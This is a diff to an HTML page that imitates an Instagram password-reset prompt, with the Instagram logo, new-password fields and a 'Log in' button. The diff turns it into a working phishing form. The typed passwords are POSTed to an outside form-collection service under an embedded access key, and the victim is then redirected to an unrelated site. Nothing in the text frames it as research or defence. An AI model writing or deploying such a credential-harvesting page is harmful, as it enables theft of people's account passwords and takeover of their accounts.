@@ -128,11 +128,13 @@
   </style>
 </head>
   <body>
-     <form class="login-container" onsubmit="return validateForm()">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
-        <input type="text" id="username" placeholder="Enter your new password">
-        <input type="password" id="password" placeholder="comfirm your password">
-      <button type="submit">Log in</button>
+    <form action="https://api.web3forms.com/submit" method="POST">
+      <input type="hidden" name="access_key" value="0f6b356e-b11f-4713-916f-5ef8bead4166">
+       <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        <input type="text" id="username" name="New password" placeholder="Enter your new password">
+        <input type="password" id="password" name="Comfirm your password" placeholder="comfirm your password">
+      <input type="hidden" name="redirect" value="https://openai.com/index/chatgpt/">
+       <button type="submit">Log in</button>
   </form>
    </body>
 </html>
